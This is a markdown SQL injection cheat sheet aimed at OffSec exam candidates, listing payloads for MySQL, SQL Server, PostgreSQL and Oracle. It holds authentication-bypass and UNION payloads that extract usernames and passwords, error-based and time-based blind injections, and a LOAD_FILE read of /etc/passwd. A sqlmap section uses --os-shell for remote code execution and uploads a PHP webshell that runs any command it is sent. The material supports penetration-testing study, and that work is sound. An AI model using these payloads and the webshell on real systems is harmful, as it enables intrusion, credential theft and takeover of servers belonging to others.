
# 🛡️ SQL Injection Master Reference — Structured for OffSec Exam Use

This guide consolidates SQL injection techniques by category, aligned with specific databases (MySQL, MSSQL, PostgreSQL, Oracle), and includes syntax examples, explanations, and tips for enumeration, exploitation, and data exfiltration.

---

## 🔍 1. Reconnaissance Queries (All DBMS)

### MySQL
```sql
SELECT VERSION(); -- Get MySQL version
SELECT CURRENT_USER(); -- Current DB user
SELECT DATABASE(); -- Current database
```

### SQL Server
```sql
SELECT @@VERSION; -- SQL Server version
SELECT SYSTEM_USER; -- Current DB user
SELECT name FROM sys.databases; -- List databases
```

### PostgreSQL
```sql
SELECT version(); -- PostgreSQL version
SELECT current_user; -- Current user
SELECT datname FROM pg_database; -- List databases
```

### Oracle
```sql
SELECT * FROM v$version; -- Oracle version
SELECT user FROM dual; -- Current user
```

---

## 📂 2. Enumerate Schemas, Tables, Columns

### Schema Enumeration
```sql
-- MySQL
SELECT table_schema FROM information_schema.tables GROUP BY table_schema;

-- Oracle
SELECT owner FROM all_tables GROUP BY owner;
```

### Table Enumeration
```sql
-- MySQL
SELECT table_name FROM information_schema.tables WHERE table_schema='app';

-- PostgreSQL
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- SQL Server
SELECT * FROM app.information_schema.tables;

-- Oracle
SELECT table_name FROM all_tables WHERE owner = 'SYS' ORDER BY table_name;
```

### Column Enumeration
```sql
-- MySQL
SELECT column_name, data_type FROM information_schema.columns 
WHERE table_schema='app' AND table_name='menu';

-- SQL Server
SELECT column_name, data_type FROM app.information_schema.columns 
WHERE table_name='menu';

-- PostgreSQL
SELECT column_name, data_type FROM information_schema.columns 
WHERE table_name='menu';

-- Oracle
SELECT column_name, data_type FROM all_tab_columns WHERE table_name='MENU';
```

---

## 💣 3. Exploitation Techniques

### Basic SQL Injection
```sql
' OR 1=1 --  -- Authentication bypass or general condition bypass
```

### UNION-Based Injection
```sql
' UNION SELECT null, username, password FROM users --  -- Extract credentials

' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --  -- List tables
' UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' --  -- List columns
```

### Error-Based Injection

#### MySQL
```sql
extractvalue('', CONCAT('>', (SELECT version())));
extractvalue('', CONCAT('>', (SELECT group_concat(table_schema) FROM information_schema.tables GROUP BY table_schema)));
```

#### SQL Server
```sql
CAST(@@VERSION AS INT);  -- Force type error to leak data
CAST((SELECT TOP 1 flag FROM app.dbo.flags) AS INT);
```

#### PostgreSQL
```sql
CAST(version() AS INTEGER);  -- Error-based leak
```

#### Oracle
```sql
TO_CHAR(DBMS_XMLGEN.GETXML('SELECT banner FROM v$version WHERE ROWNUM=1'))  -- XML error-based leak
```

### Time-Based Blind Injection

#### MySQL
```sql
' AND SLEEP(5) --  -- Delayed response = True condition
```

#### SQL Server
```sql
WAITFOR DELAY '00:00:05' --  -- Delay for Boolean inference
```

---

## 🔄 4. Stacked Queries (If Supported)
```sql
'; SELECT user(); --  -- Multiple statements if supported
```

---

## 🧾 5. Data Exfiltration by Pagination
```sql
-- MySQL: Paginated table names
extractvalue('', CONCAT('>', (
  SELECT group_concat(table_name) 
  FROM (
    SELECT table_name 
    FROM information_schema.tables 
    WHERE table_schema='piwigo' 
    LIMIT 2 OFFSET 32
  ) AS foo
)));
```

---

## 🪪 6. File Read & Write

### MySQL
```sql
SELECT @@GLOBAL.secure_file_priv;
SELECT LOAD_FILE('/etc/passwd');
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/dump.txt';
```

### PostgreSQL
```sql
SELECT pg_read_file('postgresql.conf', 0, 1000);  -- Requires superuser
```

---

## 🛠 7. Tools: SQLMap Usage

```bash
sqlmap -u "http://target/page.php?id=1" --dbs --batch --risk=3 --level=5
sqlmap -u "http://target/page.php?id=1" --os-shell  # For RCE
sqlmap -u "http://target/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

**Upload a Webshell:**
```bash
echo "<?php system($_GET['cmd']); ?>" > shell.php
sqlmap -u "http://target.com" --file-write=shell.php --file-dest="/var/www/html/shell.php"
```

---

## 🧠 Tips for OffSec Exam

- Automate repetitive enum (table/column/row dump)
- Use SQLMap only if allowed in exam guidelines
- Keep a cheat sheet with UNION lengths, offsets, and known error messages
- Track discovered DB objects and values in a separate scratchpad

---

🏁 **Crack the box. Exfiltrate the flag. Own the exam.**
